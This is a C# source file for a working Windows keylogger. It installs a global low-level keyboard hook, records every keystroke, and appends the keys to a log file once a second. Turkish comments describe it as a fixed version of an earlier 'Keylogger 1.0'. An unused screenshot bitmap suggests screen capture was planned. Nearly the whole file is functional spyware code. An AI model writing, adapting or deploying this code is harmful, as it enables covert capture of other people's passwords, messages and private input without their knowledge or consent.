using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Collections.Generic;
using System.Timers;
using System.Drawing;
using System.Drawing.Imaging;

class Program
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static List<int> codes = new List<int>();
    private static System.Timers.Timer timer = new System.Timers.Timer(1000);
    private static Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
    private static int n = 0;

    public static void Main()
    {
        timer.Enabled = true;
        timer.AutoReset = true;
        timer.Elapsed += Timer_Elapsed;
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static void Timer_Elapsed(object sender, ElapsedEventArgs e)
    {
        SaveToFile("log.txt");
    }

    private static bool SaveToFile(string filename) {
        try
        {
            if (codes.Count != 0)
            {
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\" + filename, true);

                foreach (var code in codes)
                    sw.Write((Keys)code + "/n");

                sw.Close();
                codes.Clear();
            }
            return true;
        }
        catch {
            return false;
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        //Keylogger 1.0da yaptığımız hata formun handleını almaktı burdaysa işletim sisteminin akışındaki handle alınmış
        //Bu sayede İşletim sisteminden tuşlar alındığında sistemin tuşlarıda kullanılabilir hale geliyor.
        //Keylogger 1.0da görev yöneticisi gibi en temel şeyler açılamıyordu bu sorun nedeniyle.
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);

            codes.Add(vkCode);

           
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    
}